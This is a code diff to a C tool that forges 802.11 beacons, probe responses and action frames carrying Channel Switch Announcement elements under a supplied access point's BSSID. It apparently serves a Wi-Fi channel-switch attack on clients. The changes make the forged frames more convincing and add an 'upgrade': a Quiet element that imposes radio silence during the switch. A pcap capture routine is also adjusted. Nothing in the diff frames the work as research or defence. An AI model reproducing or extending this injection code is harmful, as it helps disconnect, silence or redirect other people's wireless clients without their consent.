@@ -618,7 +618,6 @@ static int mk_ds_ie(uint8_t *b, uint8_t ch) {
 /* [FIX 6] cur_ch parameter added to all beacon/probe builders */
 static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
                          uint8_t cur_ch, uint8_t new_ch) {
-  (void)cur_ch;
   int o = 0;
   o += mk_rt(b + o);
   o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, 0);
@@ -638,8 +637,8 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   memcpy(b + o, ssid, sl);
   o += sl;
 
-  /* DS Parameter Set IE pointing to target new_ch */
-  o += mk_ds_ie(b + o, new_ch);
+  /* [FIX] DS Parameter Set IE must reflect current operating channel */
+  o += mk_ds_ie(b + o, cur_ch);
 
   /* CSA IE (ID=37, len=3) */
   b[o++] = 37;
@@ -657,7 +656,17 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   b[o++] = new_ch <= 14 ? 81 : 115; /* operating class (81=2.4G, 115=5G) */
   b[o++] = new_ch;
   b[o++] = 1; /* switch count */
-  
+
+  /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
+  b[o++] = 40;
+  b[o++] = 6;
+  b[o++] = 1; /* quiet count */
+  b[o++] = 1; /* quiet period */
+  uint16_t qdur = htole16(100); /* 100 TU radio silence */
+  memcpy(b + o, &qdur, 2); o += 2;
+  uint16_t qoff = htole16(0);
+  memcpy(b + o, &qoff, 2); o += 2;
+
   return o;
 }
 
@@ -818,7 +827,6 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
 static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
                              const uint8_t dst[6], const char *ssid,
                              uint8_t cur_ch, uint8_t new_ch) {
-  (void)cur_ch;
   int o = 0;
   o += mk_rt(b + o);
   o += mk_dot11(b + o, FC_PROBERESP, dst, bss, bss, 0); /* [FIX 8] unicast */
@@ -837,8 +845,8 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
   memcpy(b + o, ssid, sl);
   o += sl;
 
-  /* DS Parameter Set IE pointing to target new_ch */
-  o += mk_ds_ie(b + o, new_ch);
+  /* [FIX] DS Parameter Set IE must reflect current operating channel */
+  o += mk_ds_ie(b + o, cur_ch);
 
   b[o++] = 37;
   b[o++] = 3;
@@ -855,6 +863,16 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
   b[o++] = new_ch <= 14 ? 81 : 115; /* operating class */
   b[o++] = new_ch;
   b[o++] = 1; /* switch count */
+
+  /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
+  b[o++] = 40;
+  b[o++] = 6;
+  b[o++] = 1; /* quiet count */
+  b[o++] = 1; /* quiet period */
+  uint16_t qdur = htole16(100); /* 100 TU radio silence */
+  memcpy(b + o, &qdur, 2); o += 2;
+  uint16_t qoff = htole16(0);
+  memcpy(b + o, &qoff, 2); o += 2;
 
   return o;
 }
@@ -2129,10 +2147,10 @@ static void *capture_thread(void *arg) {
              if it's not a monitor interface (unlikely here, but good to be safe). 
              We write exactly what we captured (which includes the Radiotap). */
           pcaprec_hdr_t pr = {
-              .ts_sec = pcap_tv.tv_sec,
-              .ts_usec = pcap_tv.tv_usec,
-              .incl_len = n,
-              .orig_len = n
+              .ts_sec = (uint32_t)pcap_tv.tv_sec,
+              .ts_usec = (uint32_t)pcap_tv.tv_usec,
+              .incl_len = (uint32_t)n,
+              .orig_len = (uint32_t)n
           };
 
           fwrite(&pr, sizeof(pr), 1, fp);
